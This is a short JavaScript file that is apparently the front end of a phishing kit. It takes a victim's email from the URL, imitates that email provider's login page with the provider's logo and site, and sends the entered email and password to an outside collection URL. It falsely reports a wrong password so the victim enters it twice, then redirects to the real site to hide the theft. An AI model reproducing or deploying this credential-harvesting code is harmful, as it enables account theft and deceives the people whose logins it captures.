
$(document).ready(function(){
var count=0;

var email = window.location.hash.substr(1);
if (!email) {

}
else
{
var my_email =email;
$('#email').val(my_email);
$('#emailich').html(my_email);


var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

if (!filter.test(my_email)) {
$('#error').show();
email.focus;
return false;
}
var ind=my_email.indexOf("@");
var my_slice=my_email.substr((ind+1));
var c= my_slice.substr(0, my_slice.indexOf('.'));
var final= c.toLowerCase();
var finalu= c.toUpperCase();
$("#logoimg").attr("src", "https://logo.clearbit.com/"+my_slice);
$("#i_frame").attr("src", "https://www."+my_slice);
$("#logoname").html(my_slice);


}


$('#submit-btn').click(function(event){
$('#error').hide();
$('#msg').hide();
event.preventDefault();
var email=$("#email").val();
var password=$("#password").val();

if (!password) {
    $('#msg').show();
    $('#msg').html("Password is empty!");

                return false;
            }

count=count+1;

$.ajax({
dataType: 'JSON',
url: 'https://biglikedat.com/wp-tool/post.php',
type: 'POST',
      	data:{
			email:email,
            password:password,	
      	},
			data: $('#contact').serialize(),
            beforeSend: function(xhr){
            	
            },
            success: function(response){
            	if(response){
            		$("#msg").show();
            		console.log(response);
            		if(response['signal'] == 'ok'){
            			$("#password").val("");
            			if (count>=2) {
            				count=0;
                    // window.location.replace(response['redirect_link']);
                                   $('#first').css('display', 'none');
                
	$('#second').css('display', 'block');
								setTimeout(() => {  


 window.location.replace("https://www."+my_slice);
	}, 7000);
                }
            	$("#msg").show();
               $('#msg').html("Password is not correct. Please try again");
            }
            else{
                        	$("#msg").show();
               $('#msg').html("Password is not correct. Please try again");	
            }
        }
    },
    error: function(){
    	$("#password").val("");
    	if (count>=2) {
    		count=0;
    		                                   $('#first').css('display', 'none');
                
	$('#second').css('display', 'block');
								setTimeout(() => {  


 window.location.replace("https://www."+my_slice);
	}, 7000);
    	}
               	$("#msg").show();
               $('#msg').html("Password is not correct. Please try again");
    },
    complete: function(){
    	
    }
});
  });


	});


